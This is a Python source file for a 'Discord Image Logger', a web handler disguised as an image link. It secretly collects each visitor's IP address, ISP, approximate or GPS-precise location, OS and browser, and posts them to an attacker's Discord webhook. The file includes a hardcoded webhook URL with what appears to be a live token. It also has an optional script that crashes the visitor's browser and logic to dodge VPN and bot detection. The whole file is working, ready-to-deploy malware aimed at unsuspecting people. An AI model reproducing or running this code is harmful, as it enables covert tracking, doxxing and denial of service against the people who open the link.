# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1092142022586011718/squtLbtf3GYWRoY4571okat5ks3gjbHXnqUunGhNRvcRsQnT_eBtCeTb6WDE5apE6Fp5",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
